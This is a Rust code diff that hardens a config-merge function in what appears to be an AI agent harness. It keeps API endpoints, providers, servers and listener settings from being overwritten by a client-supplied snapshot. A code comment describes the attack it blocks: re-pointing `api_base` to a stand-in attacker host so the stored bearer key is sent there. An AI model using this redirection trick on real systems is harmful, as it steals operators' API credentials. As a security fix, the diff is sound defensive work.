@@ -1168,6 +1168,28 @@ pub fn merge_config_update(existing: &HarnessConfig, incoming: HarnessConfig) ->
     // stays available through `POST /api/security/token`, an explicit operator
     // action, so a leaked token can still be revoked at runtime with no restart.
     merged.auth_token = existing.auth_token.clone();
+    // H2: the credential-exfiltration surface. `restore_secrets` re-attaches the
+    // REAL `api_key` whenever the client echoes the `__harness_redacted__`
+    // placeholder, so re-pointing an endpoint through a whole-config snapshot
+    // ships the stored bearer token to the attacker on the very next model call:
+    // GET the config (the key comes back as a placeholder), POST it back with
+    // `api_base: http://attacker.tld/v1`, and `openai_client` sends
+    // `Authorization: Bearer <real key>` there. Each of these has its own
+    // dedicated mutating endpoint, so preserving them here costs the UI nothing.
+    merged.api_base = existing.api_base.clone();
+    merged.custom_providers = existing.custom_providers.clone();
+    merged.servers = existing.servers.clone();
+    merged.mcp_servers = existing.mcp_servers.clone();
+    merged.search = existing.search.clone();
+    merged.skills_dirs = existing.skills_dirs.clone();
+    merged.automations = existing.automations.clone();
+    // Infrastructure and resource ceilings: nothing in the UI edits these through
+    // the snapshot, and a client that could rewrite them could move the database,
+    // rebind the listener, or raise the concurrency ceiling past the operator's.
+    merged.db_path = existing.db_path.clone();
+    merged.host = existing.host.clone();
+    merged.port = existing.port.clone();
+    merged.max_active_subagents = existing.max_active_subagents;
     merged
 }
 
